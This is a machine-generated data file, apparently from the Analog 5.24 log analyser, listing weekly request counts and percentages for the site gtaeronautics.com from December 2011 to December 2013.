x	VE	analog 5.24
x	HN	gtaeronautics.com
W	Rr	1108	0.145	2013	12	22
W	Rr	1226	0.161	2013	12	15
W	Rr	1285	0.169	2013	12	08
W	Rr	1289	0.169	2013	12	01
W	Rr	1404	0.184	2013	11	24
W	Rr	1142	0.150	2013	11	17
W	Rr	1334	0.175	2013	11	10
W	Rr	1277	0.168	2013	11	03
W	Rr	1035	0.136	2013	10	27
W	Rr	1309	0.172	2013	10	20
W	Rr	1302	0.171	2013	10	13
W	Rr	1432	0.188	2013	10	06
W	Rr	1178	0.155	2013	09	29
W	Rr	947	0.124	2013	09	22
W	Rr	1254	0.165	2013	09	15
W	Rr	1099	0.144	2013	09	08
W	Rr	1053	0.138	2013	09	01
W	Rr	1010	0.133	2013	08	25
W	Rr	1102	0.145	2013	08	18
W	Rr	1063	0.140	2013	08	11
W	Rr	1105	0.145	2013	08	04
W	Rr	1377	0.181	2013	07	28
W	Rr	1498	0.197	2013	07	21
W	Rr	1295	0.170	2013	07	14
W	Rr	1237	0.162	2013	07	07
W	Rr	1003	0.132	2013	06	30
W	Rr	1275	0.167	2013	06	23
W	Rr	1072	0.141	2013	06	16
W	Rr	1249	0.164	2013	06	09
W	Rr	1521	0.200	2013	06	02
W	Rr	1256	0.165	2013	05	26
W	Rr	1091	0.143	2013	05	19
W	Rr	1359	0.178	2013	05	12
W	Rr	1130	0.148	2013	05	05
W	Rr	1215	0.160	2013	04	28
W	Rr	1368	0.180	2013	04	21
W	Rr	1318	0.173	2013	04	14
W	Rr	1408	0.185	2013	04	07
W	Rr	1277	0.168	2013	03	31
W	Rr	1452	0.191	2013	03	24
W	Rr	1418	0.186	2013	03	17
W	Rr	1217	0.160	2013	03	10
W	Rr	1490	0.196	2013	03	03
W	Rr	1353	0.178	2013	02	24
W	Rr	1268	0.167	2013	02	17
W	Rr	1274	0.167	2013	02	10
W	Rr	1153	0.151	2013	02	03
W	Rr	1266	0.166	2013	01	27
W	Rr	1271	0.167	2013	01	20
W	Rr	1449	0.190	2013	01	13
W	Rr	1253	0.165	2013	01	06
W	Rr	1309	0.172	2012	12	30
W	Rr	1156	0.152	2012	12	23
W	Rr	1336	0.175	2012	12	16
W	Rr	1575	0.207	2012	12	09
W	Rr	1087	0.143	2012	12	02
W	Rr	1376	0.181	2012	11	25
W	Rr	1136	0.149	2012	11	18
W	Rr	1341	0.176	2012	11	11
W	Rr	1418	0.186	2012	11	04
W	Rr	1103	0.145	2012	10	28
W	Rr	1200	0.158	2012	10	21
W	Rr	1382	0.181	2012	10	14
W	Rr	1127	0.148	2012	10	07
W	Rr	1187	0.156	2012	09	30
W	Rr	1172	0.154	2012	09	23
W	Rr	1034	0.136	2012	09	16
W	Rr	944	0.124	2012	09	09
W	Rr	958	0.126	2012	09	02
W	Rr	734	0.096	2012	08	26
W	Rr	881	0.116	2012	08	19
W	Rr	874	0.115	2012	08	12
W	Rr	973	0.128	2012	08	05
W	Rr	1010	0.133	2012	07	29
W	Rr	943	0.124	2012	07	22
W	Rr	1089	0.143	2012	07	15
W	Rr	888	0.117	2012	07	08
W	Rr	845	0.111	2012	07	01
W	Rr	1070	0.141	2012	06	24
W	Rr	1050	0.138	2012	06	17
W	Rr	1271	0.167	2012	06	10
W	Rr	957	0.126	2012	06	03
W	Rr	1249	0.164	2012	05	27
W	Rr	1055	0.139	2012	05	20
W	Rr	1392	0.183	2012	05	13
W	Rr	1140	0.150	2012	05	06
W	Rr	1807	0.237	2012	04	29
W	Rr	1225	0.161	2012	04	22
W	Rr	1264	0.166	2012	04	15
W	Rr	1075	0.141	2012	04	08
W	Rr	1261	0.166	2012	04	01
W	Rr	1345	0.177	2012	03	25
W	Rr	1254	0.165	2012	03	18
W	Rr	1478	0.194	2012	03	11
W	Rr	1503	0.197	2012	03	04
W	Rr	1532	0.201	2012	02	26
W	Rr	1464	0.192	2012	02	19
W	Rr	1154	0.152	2012	02	12
W	Rr	1240	0.163	2012	02	05
W	Rr	1088	0.143	2012	01	29
W	Rr	1125	0.148	2012	01	22
W	Rr	60	0.008	2012	01	15
W	Rr	1472	0.193	2012	01	08
W	Rr	1122	0.147	2012	01	01
W	Rr	888	0.117	2011	12	25
W	Rr	1360	0.179	2011	12	18
W	Rr	1486	0.195	2011	12	11
